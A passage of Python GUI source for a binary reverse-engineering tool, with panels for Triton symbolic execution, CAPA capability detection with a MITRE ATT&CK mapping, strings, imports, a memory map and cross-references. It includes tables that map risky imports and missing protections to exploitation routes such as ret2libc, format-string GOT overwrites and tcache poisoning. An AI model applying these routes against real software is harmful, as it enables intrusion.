                '<code>&nbsp;&nbsp;sudo apt install libboost-dev libpython3-dev<br>'
                '&nbsp;&nbsp;git clone https://github.com/JonathanSalwan/Triton<br>'
                '&nbsp;&nbsp;cd Triton && mkdir build && cd build<br>'
                '&nbsp;&nbsp;cmake .. -DPYTHON_VERSION=3 && make -j$(nproc)<br>'
                '&nbsp;&nbsp;sudo make install</code><br><br>'
                '<b>What you get when installed:</b><br>'
                '&nbsp;• Symbolic execution of any function/address range<br>'
                '&nbsp;• Automatic path constraint collection &amp; solving<br>'
                '&nbsp;• Interactive symbolic variable definition<br>'
                '&nbsp;• Deobfuscation of VM-based challenges<br>'
            )
            lbl.setTextFormat(Qt.TextFormat.RichText); lbl.setWordWrap(True)
            lbl.setStyleSheet(f'padding:20px;color:{C["text"]};font-size:12px;')
            layout.addWidget(lbl); layout.addStretch(); return

        top = QHBoxLayout()
        self._addr_edit = QLineEdit(); self._addr_edit.setPlaceholderText('Start address (hex)…')
        self._size_edit = QLineEdit('0x200'); self._size_edit.setMaximumWidth(100)
        btn_exec = QPushButton('▶ Symbolically Execute'); btn_exec.setObjectName('accent')
        btn_exec.clicked.connect(self._run)
        top.addWidget(QLabel('From:')); top.addWidget(self._addr_edit)
        top.addWidget(QLabel('Size:')); top.addWidget(self._size_edit)
        top.addWidget(btn_exec)
        layout.addLayout(top)

        self._output = QPlainTextEdit(); self._output.setReadOnly(True)
        self._output.setFont(QFont('JetBrains Mono', 9))
        self._output.setPlainText('# Triton ready.\n# Enter an address range and click Execute.\n')
        layout.addWidget(self._output)

        layout.addWidget(QLabel('Interactive (ctx = TritonContext):'))
        inp = QHBoxLayout()
        self._input = QLineEdit(); self._input.setPlaceholderText('Python expr — e.g. ctx.getSymbolicRegisters()')
        self._input.returnPressed.connect(self._eval_expr)
        inp.addWidget(QLabel('>>>'), 0); inp.addWidget(self._input, 1)
        layout.addLayout(inp)

    def _run(self):
        try:
            addr = int(self._addr_edit.text().strip(), 16)
            size = int(self._size_edit.text().strip() or '0x200', 16)
        except ValueError:
            self._output.setPlainText('Invalid address or size (use hex, e.g. 0x401000)'); return

        self._output.setPlainText('Running Triton symbolic execution…')

        def do_triton():
            import triton
            ctx = triton.TritonContext()
            # Select architecture dynamically
            arch_map = {
                'x86_64':  'X86_64',
                'x86':     'X86',
                'ARM':     'ARM32',
                'AArch64': 'AARCH64',
            }
            triton_arch_name = arch_map.get(self.loader.arch, 'X86_64')
            triton_arch = getattr(triton.ARCH, triton_arch_name, triton.ARCH.X86_64)
            ctx.setArchitecture(triton_arch)
            ctx.setMode(triton.MODE.ALIGNED_MEMORY, True)
            # Map all loadable segments
            try:
                if self.loader._elf:
                    for seg in self.loader._elf.iter_segments():
                        if seg['p_type'] == 'PT_LOAD':
                            try: ctx.setConcreteMemoryAreaValue(seg['p_vaddr'], list(seg.data()))
                            except Exception as _e: log.debug(f"Suppressed: {_e}")
            except Exception as _e: log.debug(f"Suppressed: {_e}")
            # Symbolize RDI as the "input" register
            rdi = ctx.getRegister(triton.REG.X86_64.RDI)
            ctx.symbolizeRegister(rdi, 'input_rdi')
            # Disassemble and process
            code = self.loader.read_vaddr(addr, size)
            if not code: return 'Cannot read memory at specified address'
            if not HAS_CAPSTONE: return 'capstone required for Triton execution'
            from capstone import Cs, CS_ARCH_X86, CS_MODE_64
            md = Cs(CS_ARCH_X86, CS_MODE_64); md.detail = True
            results = [f'Symbolically executing {hex(addr)}+{hex(size)}…', '']
            insn_count = 0
            for insn in md.disasm(code, addr):
                try:
                    ctx.setConcreteRegisterValue(ctx.getRegister(triton.REG.X86_64.RIP), insn.address)
                    ti = triton.Instruction(insn.address, bytes(insn.bytes))
                    ctx.processing(ti)
                    insn_count += 1
                except Exception as e:
                    results.append(f'  [{hex(insn.address)}] {insn.mnemonic} {insn.op_str}  → {e}')
                    break
            results.append(f'Processed {insn_count} instructions.')
            results.append('')
            results.append('Path constraints:')
            pcs = ctx.getPathConstraints()
            if not pcs: results.append('  (none — no conditional branches taken)')
            for pc in pcs[:20]:
                for branch_addr, is_taken, constraint in pc.getBranchConstraints():
                    tag = 'taken' if is_taken else 'not-taken'
                    results.append(f'  {hex(branch_addr)} [{tag}]: {constraint}')
            self._ctx = ctx
            return '\n'.join(results)

        w = Worker(do_triton)
        w.result.connect(self._output.setPlainText)
        w.error.connect(lambda e: self._output.setPlainText(f'Triton error:\n{e}'))
        w.finished.connect(lambda: w.deleteLater())
        w.start(); self._worker = w

    def _eval_expr(self):
        expr = self._input.text().strip()
        if not expr: return
        self._input.clear()
        try:
            result = eval(expr, {'ctx': self._ctx, 'loader': self.loader})
            self._output.appendPlainText(f'>>> {expr}\n{result}\n')
        except Exception as e:
            self._output.appendPlainText(f'>>> {expr}\nError: {e}\n')


# ── CAPA Capabilities Panel ───────────────────────────────────────────
MITRE_MAP: Dict[str, Tuple[str, str, str]] = {
    'execution':            ('TA0002', 'T1106',     'Native API — direct syscall execution'),
    'process':              ('TA0002', 'T1059',     'Command and Scripting Interpreter'),
    'anti-analysis':        ('TA0005', 'T1027',     'Obfuscated Files or Information'),
    'anti-behavioral':      ('TA0005', 'T1027.002', 'Software Packing / obfuscation'),
    'anti-static':          ('TA0005', 'T1027.001', 'Binary Padding / stripped symbols'),
    'persistence':          ('TA0003', 'T1547',     'Boot or Logon Autostart Execution'),
    'defense-evasion':      ('TA0005', 'T1055',     'Process Injection'),
    'privilege-escalation': ('TA0004', 'T1068',     'Exploitation for Privilege Escalation'),
    'credential-access':    ('TA0006', 'T1003',     'OS Credential Dumping'),
    'discovery':            ('TA0007', 'T1082',     'System Information Discovery'),
    'lateral-movement':     ('TA0008', 'T1021',     'Remote Services'),
    'collection':           ('TA0009', 'T1005',     'Data from Local System'),
    'exfiltration':         ('TA0010', 'T1041',     'Exfiltration Over C2 Channel'),
    'command-and-control':  ('TA0011', 'T1071',     'Application Layer Protocol'),
    'impact':               ('TA0040', 'T1486',     'Data Encrypted for Impact'),
    'cryptography':         ('TA0040', 'T1027.013', 'Encrypted/Encoded File (custom crypto)'),
    'file-system':          ('TA0007', 'T1083',     'File and Directory Discovery'),
    'network':              ('TA0011', 'T1095',     'Non-Application Layer Protocol'),
    'heap':                 ('TA0005', 'T1055.012', 'Process Hollowing / heap spray'),
    'injection':            ('TA0005', 'T1055',     'Process Injection'),
    'obfuscation':          ('TA0005', 'T1027',     'Obfuscated Code'),
    'packer':               ('TA0005', 'T1027.002', 'Software Packing'),
    'socket':               ('TA0011', 'T1095',     'Non-Application Layer Protocol'),
    'dns':                  ('TA0011', 'T1071.004', 'DNS Application Layer Protocol'),
    'http':                 ('TA0011', 'T1071.001', 'Web Protocols'),
    'registry':             ('TA0003', 'T1547.001', 'Registry Run Keys / Startup Folder'),
    'service':              ('TA0003', 'T1543',     'Create or Modify System Process'),
    'shellcode':            ('TA0005', 'T1059.006', 'Shellcode / native execution'),
    'rop':                  ('TA0005', 'T1203',     'Exploitation for Client Execution (ROP)'),
    'format-string':        ('TA0004', 'T1203',     'Exploitation — Format String'),
    'buffer-overflow':      ('TA0004', 'T1203',     'Exploitation — Stack Buffer Overflow'),
    'use-after-free':       ('TA0004', 'T1203',     'Exploitation — Use After Free'),
    'heap-overflow':        ('TA0004', 'T1203',     'Exploitation — Heap Overflow'),
    'lib':                  ('TA0005', 'T1129',     'Shared Modules'),
    'compiler':             ('TA0005', 'T1027',     'Compiler/runtime artifacts'),
    'string':               ('TA0005', 'T1027.005', 'Indicator Removal / string obfuscation'),
    'allocate':             ('TA0005', 'T1055.001', 'DLL Injection / dynamic allocation'),
    'send':                 ('TA0011', 'T1041',     'Exfiltration Over C2 Channel'),
    'recv':                 ('TA0011', 'T1071',     'Application Layer Protocol — recv'),
}

EXPLOIT_TECHNIQUES: Dict[str, str] = {
    'gets':     'Stack BOF via unbounded read — ret2win / ROP / shellcode (NX off)',
    'strcpy':   'Stack BOF — overwrite saved RIP with ROP chain or win address',
    'sprintf':  'Stack BOF or fmt string — check format arg control',
    'printf':   'Format string: leak canary+PIE with %p; GOT overwrite via %n',
    'system':   'ret2system: control RDI (/bin/sh addr) via pop rdi ; ret gadget',
    'malloc':   'Heap: tcache poison, fastbin dup, unsafe unlink, __free_hook overwrite',
    'free':     'Double-free: tcache/fastbin corruption, arbitrary allocation primitive',
    'memcpy':   'Stack/heap BOF if size param is attacker-controlled — check bounds',
    'scanf':    'Stack BOF — no width specifier; use %Ns or switch to fgets',
    'dlopen':   'Library hijack via LD_PRELOAD or writable RPATH entry',
    'setuid':   'SUID binary — PATH hijack, BOF, or logic flaw leads to root shell',
    'rand':     'Predictable PRNG seeded from time() — brute-force or predict sequence',
    'popen':    'Shell injection if args include unsanitized user input',
    'exec':     'Command injection — validate and sanitize all arguments strictly',
    'alloca':   'Stack allocation without bounds — negative size or large value overflows',
}


class CapaPanel(QWidget):
    navigate_to = Signal(int)

    def __init__(self, loader: BinaryLoader, parent=None):
        super().__init__(parent)
        self.loader = loader
        layout = QVBoxLayout(self); layout.setContentsMargins(0, 0, 0, 0)

        tb = QHBoxLayout()
        btn_scan = _btn('capa', 'Run CAPA Analysis'); btn_scan.setObjectName('accent')
        btn_scan.clicked.connect(self._run_capa)
        btn_vuln = _btn('vuln', 'Vuln Hints')
        btn_vuln.clicked.connect(self._run_vuln_hints)
        btn_exp = _btn('solve', 'Exploit Paths')
        btn_exp.clicked.connect(self._show_exploit_paths)
        tb.addWidget(btn_scan); tb.addWidget(btn_vuln); tb.addWidget(btn_exp); tb.addStretch()
        layout.addLayout(tb)

        self._status = QLabel('Click "Run CAPA Analysis" to detect capabilities.')
        self._status.setWordWrap(True)
        self._status.setStyleSheet(f'color:{C["subtext0"]};padding:4px;')
        layout.addWidget(self._status)

        self._progress = QProgressBar()
        self._progress.setMaximumHeight(4)
        self._progress.setTextVisible(False)
        self._progress.hide()
        layout.addWidget(self._progress)

        self._tree = QTreeWidget()
        self._tree.setHeaderLabels(['Rule / Category', 'Matches', 'MITRE Tactic', 'MITRE ID', 'Address(es)'])
        self._tree.header().setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        self._tree.setColumnWidth(1, 65)
        self._tree.setColumnWidth(2, 190)
        self._tree.setColumnWidth(3, 85)
        self._tree.setColumnWidth(4, 220)
        self._tree.itemClicked.connect(self._on_click)
        self._tree.itemDoubleClicked.connect(self._on_dbl)
        layout.addWidget(self._tree)

        self._detail = QPlainTextEdit()
        self._detail.setReadOnly(True)
        self._detail.setMaximumHeight(140)
        self._detail.setFont(QFont('JetBrains Mono', 9))
        self._detail.setPlaceholderText('Click a rule to see MITRE details + exploitation notes…')
        layout.addWidget(self._detail)

        if not HAS_CAPA:
            self._status.setText(
                'CAPA not installed — showing built-in vuln hints.\n'
                'Install: pip install flare-capa'
            )
        QTimer.singleShot(0, self._run_vuln_hints)

    def _mitre_for_ns(self, ns: str) -> Tuple[str, str, str]:
        ns_lower = ns.lower()
        for key, val in MITRE_MAP.items():
            if key in ns_lower:
                return val
        return ('—', '—', '—')

    def _run_capa(self):
        if not HAS_CAPA:
            self._status.setText('CAPA not installed — showing built-in vuln hints.')
            self._run_vuln_hints(); return
        self._status.setText('Running CAPA (30–90 s)…')
        self._progress.setRange(0, 0)  # indeterminate
        self._progress.show()
        def do_capa():
            try:
                import capa.main, capa.rules, capa.rules.cache, capa.loader as cloader, pathlib
                sigpaths = capa.main.get_default_signatures()
                # Try to find capa rules — may not be bundled
                capa_root = pathlib.Path(capa.main.get_default_root())
                rules_candidates = [
                    capa_root / 'rules',
                    capa_root.parent / 'rules',
                    capa_root / 'capa' / 'rules',
                    pathlib.Path('/usr/share/capa/rules'),
                    pathlib.Path('/usr/local/share/capa/rules'),
                    pathlib.Path(os.path.expanduser('~/.capa/rules')),
                ]
                rules_dir = None
                for p in rules_candidates:
                    if p.is_dir():
                        if any(f.suffix == '.yml' for f in p.iterdir()):
                            rules_dir = p; break
                        if any(True for _ in p.rglob('*.yml')):
                            rules_dir = p; break
                if not rules_dir:
                    raise RuntimeError('CAPA rules not found — run: flare-capa --init')
                rules = capa.rules.get_rules([rules_dir])
                extractor = cloader.get_extractor(
                    pathlib.Path(self.loader.path), 'auto', 'auto', 'vivisect', sigpaths)
                result = capa.main.find_capabilities(rules, extractor, disable_progress=True)
                return result.matches if hasattr(result, 'matches') else result
            except Exception as e:
                raise RuntimeError(str(e))
        w = Worker(do_capa)
        w.result.connect(self._show_capa_results)
        w.error.connect(lambda e: (
            self._progress.hide(),
            self._status.setText(f'CAPA error: {e}\nFalling back to built-in hints.'),
            self._run_vuln_hints()
        ))
        w.finished.connect(lambda: w.deleteLater())
        w.start(); self._worker = w

    def _show_capa_results(self, capabilities):
        self._progress.hide()
        self._tree.clear()
        by_ns: Dict[str, list] = defaultdict(list)
        try:
            for rule_name, matches in capabilities.items():
                ns = ''
                if hasattr(matches, '__iter__') and not isinstance(matches, dict):
                    first = next(iter(matches), None)
                    ns = getattr(first, 'namespace', '') if hasattr(first, 'namespace') else ''
                by_ns[str(ns) if ns else '(uncategorized)'].append((rule_name, matches))
        except Exception as e:
            self._status.setText(f'Error displaying: {e}'); return
        total = sum(len(v) for v in by_ns.values())
        for ns, rules in sorted(by_ns.items()):
            tactic, tid, tdesc = self._mitre_for_ns(ns)
            ns_item = QTreeWidgetItem([ns, str(len(rules)), tactic, tid, ''])
            ns_item.setForeground(0, QColor(C['blue']))
            ns_item.setForeground(2, QColor(C['mauve']))
            ns_item.setForeground(3, QColor(C['yellow']))
            self._tree.addTopLevelItem(ns_item)
            for rule_name, matches in rules:
                addrs = []
                try:
                    for loc, _ in matches:
                        addrs.append(hex(loc.value))
                except Exception as _e:
                    log.debug(f"Suppressed: {_e}")
                r_item = QTreeWidgetItem([
                    rule_name, str(len(addrs)), '', '',
                    ', '.join(addrs[:8]) + ('…' if len(addrs) > 8 else '')
                ])
                r_item.setData(0, Qt.ItemDataRole.UserRole, {
                    'rule': rule_name, 'ns': ns, 'addrs': addrs,
                    'tactic': tactic, 'tid': tid, 'tdesc': tdesc
                })
                r_item.setForeground(4, QColor(C['teal']))
                ns_item.addChild(r_item)
            ns_item.setExpanded(True)
        self._status.setText(
            f'CAPA: {len(by_ns)} namespaces · {total} rules matched. Click a rule for details.')

    def _run_vuln_hints(self):
        self._tree.clear()
        imports = {i['name'] for i in self.loader.get_imports()}
        by_sev: Dict[str, QTreeWidgetItem] = {}
        found = 0
        for func, (sev, desc, fix) in VULN_PATTERNS.items():
            if func in imports:
                if sev not in by_sev:
                    sev_item = QTreeWidgetItem([sev, '', '', '', ''])
                    sev_item.setForeground(0, QColor(SEVERITY_COLORS.get(sev, C['text'])))
                    self._tree.addTopLevelItem(sev_item)
                    by_sev[sev] = sev_item
                tactic, tid, tdesc = self._mitre_for_ns(func)
                exp = EXPLOIT_TECHNIQUES.get(func, '')
                item = QTreeWidgetItem([func, '', tactic, tid, desc])
                item.setForeground(2, QColor(C['mauve']))
                item.setForeground(3, QColor(C['yellow']))
                item.setForeground(4, QColor(C['orange']))
                item.setData(0, Qt.ItemDataRole.UserRole, {
                    'rule': func, 'ns': 'vuln-hints', 'addrs': [],
                    'tactic': tactic, 'tid': tid, 'tdesc': tdesc,
                    'desc': desc, 'fix': fix, 'exploit': exp
                })
                by_sev[sev].addChild(item)
                found += 1
        for item in by_sev.values():
            item.setExpanded(True)
        self._status.setText(f'Built-in vuln scan: {found} dangerous imports found.')

    def _show_exploit_paths(self):
        self._tree.clear()
        imports = {i['name'] for i in self.loader.get_imports()}
        prot = self.loader.protections()
        nx     = 'Enabled' in prot.get('NX (No-Execute)', '')
        pie    = 'Enabled' in prot.get('PIE (ASLR)', '')
        canary = 'Enabled' in prot.get('Stack Canary', '')
        relro  = 'Full'    in prot.get('RELRO', '')

        paths = []
        if 'gets' in imports or 'strcpy' in imports or 'scanf' in imports:
            tech = []
            if not nx:              tech.append('shellcode on stack (NX disabled)')
            if nx and not canary:   tech.append('ret2win / ret2libc (no canary)')
            if nx and canary:       tech.append('leak canary via format string then BOF')
            if nx and pie:          tech.append('leak PIE base via puts(got.puts) then ret2libc')
            if nx and not pie:      tech.append('fixed addresses — direct ROP chain')
            paths.append(('Stack Buffer Overflow', tech, 'T1203', 'TA0004'))
        if 'printf' in imports:
            tech = ['%p chain to leak canary + PIE base', 'write-what-where via %n to overwrite GOT']
            if not relro:           tech.append('GOT overwrite to redirect any call to system()')
            paths.append(('Format String Vulnerability', tech, 'T1203', 'TA0004'))
        if 'malloc' in imports and 'free' in imports:
            tech = ['tcache poisoning → arbitrary alloc at any address',
                    'fastbin dup → __free_hook / __malloc_hook overwrite']
            if not relro:           tech.append('unsorted bin attack → _IO_list_all overwrite')
            paths.append(('Heap Exploitation', tech, 'T1203', 'TA0004'))
        if 'system' in imports:
            paths.append(('ret2system available',
                ['Need: pop rdi ; ret gadget to set RDI = &"/bin/sh"',
                 'Find /bin/sh in: libc or binary strings',
                 'Entry to system @ PLT'], 'T1203', 'TA0002'))
        if not nx:
            paths.append(('Shellcode Injection (NX disabled)',
                ['Stack/heap shellcode placement + jump',
                 'Use msfvenom or pwntools shellcraft.sh()'], 'T1059', 'TA0002'))
        if not paths:
            paths.append(('No obvious primitive — deeper analysis required',
                ['Try angr symbolic execution (see Solvers tab)',
                 'Look for logic flaws, off-by-one, type confusion',
                 'Check for integer overflow before size-controlled ops'], '—', '—'))

        for path_name, techniques, tid, tactic in paths:
            parent = QTreeWidgetItem([path_name, str(len(techniques)), tactic, tid, ''])
            parent.setForeground(0, QColor(C['red']))
            parent.setForeground(2, QColor(C['mauve']))
            parent.setForeground(3, QColor(C['yellow']))
            self._tree.addTopLevelItem(parent)
            for t in techniques:
                child = QTreeWidgetItem(['', '', '', '', t])
                child.setForeground(4, QColor(C['green']))
                parent.addChild(child)
            parent.setExpanded(True)

        prot_summary = (
            f'NX={prot.get("NX (No-Execute)","?")}  '
            f'PIE={prot.get("PIE (ASLR)","?")}  '
            f'Canary={prot.get("Stack Canary","?")}  '
            f'RELRO={prot.get("RELRO","?")}'
        )
        self._status.setText(f'Exploitation path analysis — {prot_summary}')

    def _on_click(self, item, col):
        data = item.data(0, Qt.ItemDataRole.UserRole)
        if not data:
            return
        lines = [
            f'Rule:       {data.get("rule","")}',
            f'Namespace:  {data.get("ns","")}',
            f'MITRE:      [{data.get("tactic","")}] {data.get("tid","")} — {data.get("tdesc","")}',
        ]
        if data.get('desc'):
            lines.append(f'Issue:      {data["desc"]}')
        if data.get('fix'):
            lines.append(f'Fix:        {data["fix"]}')
        if data.get('exploit'):
            lines.append(f'Exploit:    {data["exploit"]}')
        addrs = data.get('addrs', [])
        if addrs:
            lines.append(f'Addresses:  {", ".join(addrs[:12])}{"…" if len(addrs)>12 else ""}')
        self._detail.setPlainText('\n'.join(lines))

    def _on_dbl(self, item, col):
        data = item.data(0, Qt.ItemDataRole.UserRole)
        if data:
            addrs = data.get('addrs', [])
            if addrs:
                try:
                    self.navigate_to.emit(int(addrs[0], 16))
                except Exception as _e:
                    log.debug(f"Suppressed: {_e}")


# ── Strings Panel ─────────────────────────────────────────────────────
class StringsPanel(QWidget):
    find_in_disasm = Signal(str)
    navigate_to    = Signal(int)

    def __init__(self, loader: BinaryLoader, parent=None):
        super().__init__(parent)
        self.loader = loader
        layout = QVBoxLayout(self); layout.setContentsMargins(0,0,0,0)

        tb = QHBoxLayout()
        self._filter = QLineEdit(); self._filter.setPlaceholderText('Filter strings…')
        self._filter.textChanged.connect(self._filter_strings)
        btn_load = QPushButton('↻ Load Strings'); btn_load.clicked.connect(self._load)
        tb.addWidget(self._filter, 1); tb.addWidget(btn_load)
        layout.addLayout(tb)

        self._list = QListWidget()
        self._list.setSelectionMode(QAbstractItemView.SelectionMode.ExtendedSelection)
        self._list.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self._list.customContextMenuRequested.connect(self._ctx_menu)
        layout.addWidget(self._list)
        self._strings: List[str] = []

    def _load(self):
        self._list.clear()
        self._strings = self.loader.get_strings()
        self._filter_strings(self._filter.text())

    def _filter_strings(self, text):
        self._list.clear()
        query = text.strip().lower()
        for s in self._strings:
            if not query or query in s.lower():
                self._list.addItem(s)

    def _ctx_menu(self, pos):
        item = self._list.itemAt(pos)
        if not item: return
        menu = QMenu(self)
        menu.addAction('Find in disassembly', lambda: self.find_in_disasm.emit(item.text()))
        menu.addAction('Copy', lambda: QApplication.clipboard().setText(item.text()))
        menu.exec(self._list.mapToGlobal(pos))


# ── Imports/Exports Panel ─────────────────────────────────────────────
class ImportsExportsPanel(QWidget):
    navigate_to = Signal(int)

    def __init__(self, loader: BinaryLoader, parent=None):
        super().__init__(parent)
        self.loader = loader
        layout = QVBoxLayout(self); layout.setContentsMargins(0,0,0,0)
        tabs = QTabWidget()

        # Imports
        self._imp_tbl = QTableWidget(0, 3)
        self._imp_tbl.setHorizontalHeaderLabels(['Name','Library','Notes'])
        self._imp_tbl.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        self._imp_tbl.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self._imp_tbl.customContextMenuRequested.connect(self._imp_ctx)
        tabs.addTab(self._imp_tbl, 'Imports')

        # Exports
        self._exp_tbl = QTableWidget(0, 2)
        self._exp_tbl.setHorizontalHeaderLabels(['Name','Address'])
        self._exp_tbl.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        self._exp_tbl.doubleClicked.connect(self._on_exp_dbl)
        tabs.addTab(self._exp_tbl, 'Exports')

        # Symbols
        self._sym_tbl = QTableWidget(0, 4)
        self._sym_tbl.setHorizontalHeaderLabels(['Name','Address','Type','Binding'])
        self._sym_tbl.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        self._sym_tbl.doubleClicked.connect(self._on_sym_dbl)
        tabs.addTab(self._sym_tbl, 'Symbols')

        layout.addWidget(tabs)
        self._load()

    def _load(self):
        imps = self.loader.get_imports()
        self._imp_tbl.setRowCount(len(imps))
        for i, imp in enumerate(imps):
            self._imp_tbl.setItem(i, 0, QTableWidgetItem(imp['name']))
            self._imp_tbl.setItem(i, 1, QTableWidgetItem(imp.get('library','')))
            # Vuln note
            note = VULN_PATTERNS.get(imp['name'], ('','',''))
            ni = QTableWidgetItem(f'[{note[0]}] {note[1]}' if note[0] else '')
            if note[0]: ni.setForeground(QColor(SEVERITY_COLORS.get(note[0], C['text'])))
            self._imp_tbl.setItem(i, 2, ni)

        exps = self.loader.get_exports()
        self._exp_tbl.setRowCount(len(exps))
        for i, exp in enumerate(exps):
            self._exp_tbl.setItem(i, 0, QTableWidgetItem(exp['name']))
            self._exp_tbl.setItem(i, 1, QTableWidgetItem(hex(exp['address'])))

        syms = self.loader.get_symbols()
        self._sym_tbl.setRowCount(len(syms))
        for i, sym in enumerate(syms):
            self._sym_tbl.setItem(i, 0, QTableWidgetItem(sym['name']))
            self._sym_tbl.setItem(i, 1, QTableWidgetItem(hex(sym['address'])))
            self._sym_tbl.setItem(i, 2, QTableWidgetItem(sym.get('type','')))
            self._sym_tbl.setItem(i, 3, QTableWidgetItem(sym.get('binding','')))

    def _imp_ctx(self, pos):
        item = self._imp_tbl.itemAt(pos)
        if not item: return
        name = self._imp_tbl.item(item.row(), 0)
        if name:
            menu = QMenu(self)
            menu.addAction(f'Search "{name.text()}" online',
                lambda: QApplication.clipboard().setText(f'site:man7.org {name.text()}'))
            menu.exec(self._imp_tbl.mapToGlobal(pos))

    def _on_exp_dbl(self, idx):
        addr_item = self._exp_tbl.item(idx.row(), 1)
        if addr_item:
            try: self.navigate_to.emit(int(addr_item.text(), 16))
            except Exception as _e: log.debug(f"Suppressed: {_e}")

    def _on_sym_dbl(self, idx):
        addr_item = self._sym_tbl.item(idx.row(), 1)
        if addr_item:
            try: self.navigate_to.emit(int(addr_item.text(), 16))
            except Exception as _e: log.debug(f"Suppressed: {_e}")


# ── Memory Map Panel (sections + segments + entropy) ─────────────────
class MemoryMapPanel(QWidget):
    navigate_to = Signal(int)

    def __init__(self, loader: BinaryLoader, parent=None):
        super().__init__(parent)
        self.loader = loader
        layout = QVBoxLayout(self); layout.setContentsMargins(0,0,0,0)
        splitter = QSplitter(Qt.Orientation.Vertical)

        # Sections + Segments tree
        self._tree = QTreeWidget()
        self._tree.setHeaderLabels(['Name','VAddr','Size','Flags/Type','Entropy'])
        self._tree.header().setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)
        self._tree.doubleClicked.connect(self._on_dbl)
        splitter.addWidget(self._tree)

        # Entropy bar widget
        self._entropy_widget = EntropyWidget(loader)
        splitter.addWidget(self._entropy_widget)
        splitter.setSizes([350, 150])
        layout.addWidget(splitter)
        self._load()

    def _load(self):
        self._tree.clear()
        secs_item = QTreeWidgetItem(['Sections']); self._tree.addTopLevelItem(secs_item)
        for sec in self.loader.get_sections():
            # Compute section entropy
            try:
                off = sec['offset']; size = sec['size']
                data = bytes(self.loader._raw[off:off+size])
                ent = self.loader.compute_entropy(data)
            except Exception: ent = 0.0
            flags_str = oct(sec['flags'])[-3:] if isinstance(sec['flags'], int) else str(sec['flags'])
            item = QTreeWidgetItem([sec['name'], hex(sec['vaddr']), f'{sec["size"]:,}',
                                    f'{sec["type"]} {flags_str}', f'{ent:.2f}'])
            item.setData(0, Qt.ItemDataRole.UserRole, sec['vaddr'])
            # Color entropy: >7 = red (packed/encrypted), >5 = yellow
            if ent > 7.0: item.setForeground(4, QColor(C['red']))
            elif ent > 5.0: item.setForeground(4, QColor(C['yellow']))
            else: item.setForeground(4, QColor(C['green']))
            secs_item.addChild(item)
        secs_item.setExpanded(True)

        segs_item = QTreeWidgetItem(['Segments']); self._tree.addTopLevelItem(segs_item)
        for seg in self.loader.get_segments():
            item = QTreeWidgetItem([str(seg['type']), hex(seg['vaddr']), f'{seg["memsz"]:,}', str(seg['flags']), ''])
            item.setData(0, Qt.ItemDataRole.UserRole, seg['vaddr'])
            # Highlight RWX
            if 'RWX' in seg['flags'] or (all(c in seg['flags'] for c in 'RWX')):
                item.setForeground(3, QColor(C['red']))
                item.setToolTip(3, '⚠ RWX segment — shellcode injection possible!')
            segs_item.addChild(item)
        segs_item.setExpanded(True)

    def _on_dbl(self, idx):
        item = self._tree.itemFromIndex(idx)
        if item:
            vaddr = item.data(0, Qt.ItemDataRole.UserRole)
            if vaddr: self.navigate_to.emit(vaddr)


class EntropyWidget(QWidget):
    def __init__(self, loader: BinaryLoader, parent=None):
        super().__init__(parent)
        self.loader = loader
        self.setMinimumHeight(80)
        self._entropy: List[float] = []
        self._compute()

    def _compute(self):
        BLOCK = 256
        raw = bytes(self.loader._raw)
        self._entropy = [self.loader.compute_entropy(raw[i:i+BLOCK])
                         for i in range(0, len(raw), BLOCK)]

    def paintEvent(self, event):
        if not self._entropy: return
        painter = QPainter(self)
        painter.setRenderHint(QPainter.RenderHint.Antialiasing)
        w, h = self.width(), self.height()
        n = len(self._entropy)
        if n == 0: return
        bw = max(1, w // n)
        for i, ent in enumerate(self._entropy):
            t = ent / 8.0
            r = int(0xf3 * t + 0x31 * (1-t))
            g = int(0x8b * (1-t) + 0x32 * t)
            b = int(0xa8 * t + 0x44 * (1-t))
            painter.fillRect(i*bw, 0, bw, h, QColor(r, g, b))
        # Label
        painter.setPen(QColor(C['text']))
        painter.drawText(4, h-4, 'File entropy map  (green=low, red=high/packed)')


# ── XRefs Panel ───────────────────────────────────────────────────────
class XRefsPanel(QWidget):
    navigate_to = Signal(int)

    def __init__(self, xrefs: XRefDB, parent=None):
        super().__init__(parent)
        self.xrefs = xrefs
        layout = QVBoxLayout(self); layout.setContentsMargins(0,0,0,0)

        tb = QHBoxLayout()
        self._addr_edit = QLineEdit(); self._addr_edit.setPlaceholderText('Address (hex)…')
        self._addr_edit.returnPressed.connect(self._query)
        btn_q = QPushButton('Query XRefs'); btn_q.clicked.connect(self._query)
        tb.addWidget(QLabel('Address:')); tb.addWidget(self._addr_edit, 1); tb.addWidget(btn_q)
        layout.addLayout(tb)

        self._tabs = QTabWidget()
        self._to_tbl   = QTableWidget(0, 2); self._to_tbl.setHorizontalHeaderLabels(['From','Type'])
        self._from_tbl = QTableWidget(0, 2); self._from_tbl.setHorizontalHeaderLabels(['To','Type'])
        for tbl in (self._to_tbl, self._from_tbl):
            tbl.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
            tbl.doubleClicked.connect(self._on_dbl)
        self._tabs.addTab(self._to_tbl, 'XRefs TO')
        self._tabs.addTab(self._from_tbl, 'XRefs FROM')
        layout.addWidget(self._tabs)

    def query_addr(self, addr: int):
        self._addr_edit.setText(hex(addr)); self._query()

    def _query(self):
        try: addr = int(self._addr_edit.text().strip(), 16)
        except ValueError: return
        to_refs   = self.xrefs.xrefs_to.get(addr, [])
        from_refs = self.xrefs.xrefs_from.get(addr, [])
        self._to_tbl.setRowCount(len(to_refs))
        for i, (frm, typ) in enumerate(to_refs):
            self._to_tbl.setItem(i, 0, QTableWidgetItem(hex(frm)))
            self._to_tbl.setItem(i, 1, QTableWidgetItem(typ))
        self._from_tbl.setRowCount(len(from_refs))
        for i, (to, typ) in enumerate(from_refs):
            self._from_tbl.setItem(i, 0, QTableWidgetItem(hex(to)))
            self._from_tbl.setItem(i, 1, QTableWidgetItem(typ))

    def _on_dbl(self, idx):
        tbl = self._tabs.currentWidget()
        item = tbl.item(idx.row(), 0)
        if item:
            try: self.navigate_to.emit(int(item.text(), 16))
            except Exception as _e: log.debug(f"Suppressed: {_e}")


# ── Bookmarks Panel ───────────────────────────────────────────────────
class BookmarksPanel(QWidget):
    navigate_to = Signal(int)

    def __init__(self, bookmarks: BookmarksDB, parent=None):
